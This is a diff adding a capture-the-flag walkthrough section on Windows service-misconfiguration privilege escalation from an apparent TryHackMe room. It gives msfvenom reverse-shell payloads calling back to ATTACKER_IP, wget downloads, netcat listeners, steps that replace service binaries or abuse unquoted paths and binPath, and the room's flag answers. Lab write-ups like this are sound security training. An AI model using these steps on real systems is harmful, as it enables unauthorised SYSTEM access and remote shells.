@@ -34,11 +34,54 @@ So we can get the flag: <br />
 ![image](https://github.com/user-attachments/assets/6fd04d11-a13f-4f30-8796-5ff2cb5920c1)<br />
 
 
-### 
+### Abusing Service Misconfigurations
+- Get the flag on svcusr1's desktop. <br />
+Follow the steps described in the task. So if we run `icacls C:\PROGRA~2\SYSTEM~1\WService.exe`<br />
+![image](https://github.com/user-attachments/assets/b90186a0-a524-4236-8518-def13024ddb0)<br />
+We can see that the EVERYONE group has modify permissions on this service. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account. <br />
+So now let's create a reverse shell using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`. Now open a web server on the attack box: `python3 -m http.server 8080`. And download it from the windows machine (using powershell): `wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe`: <br />
+![image](https://github.com/user-attachments/assets/3373ddd3-a9c0-484c-9d44-39b1f871a705)<br />
+Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
 
-### 
+      cd C:\PROGRA~2\SYSTEM~1\
+      move WService.exe WService.exe.bkp
+      move C:\Users\thm-unpriv\Desktop\rev-svc.exe WService.exe
+      icacls WService.exe /grant Everyone:F
 
-### 
+Now start a reverse listener on the attack box: `nc -lvp 4445`, and execute the service(from cmd): 
+
+    C:\> sc stop windowsscheduler
+    C:\> sc start windowsscheduler
+
+![image](https://github.com/user-attachments/assets/33b15ca5-6750-4790-90a7-d5d29603dd76)<br />
+`THM{AT_YOUR_SERVICE}`
+
+- Get the flag on svcusr2's desktop.<br />
+Following the steps on the task, if we run `sc qc "disk sorter enterprise"`<br />
+![image](https://github.com/user-attachments/assets/196bffbe-5b69-4d1d-935c-3552622a13ad)<br />
+We can see that the service is unquoted, and also is store inside C:\MyPrograms\. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using `icacls`.
+So again, create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe` and transfer it to the windows machine. Open a netcat listener `nc -lnvp 4446`. Now on the windows machine(powershell):
+
+      move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+      icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+And on cmd: 
+
+      sc stop "disk sorter enterprise"
+      sc start "disk sorter enterprise"
+![image](https://github.com/user-attachments/assets/100489b4-da77-4ee5-b4f5-a8db1a86c427)<br />
+`THM{QUOTES_EVERYWHERE}`
+      
+- Get the flag on the Administrator's desktop. <br />
+If we run `accesschk64.exe -qlc thmservice`: <br />
+![image](https://github.com/user-attachments/assets/d749c7d0-a0e0-4209-9a00-ceaa7c76a6c0)<br />
+Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. So, lets create a payload with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe`. <br />
+Remember to grant permissions to Everyone to execute your payload: `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`. Now from cmd: `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`, and, after setting a netcat listener, restart the service to get the flag: `THM{INSECURE_SVC_CONFIG}`
+
+### Abusing dangerous privileges
+- Get the flag on the Administrator's desktop.
+
+### Abusing vulnerable software
+- Get the flag on the Administrator's desktop.
 
 ### 
 
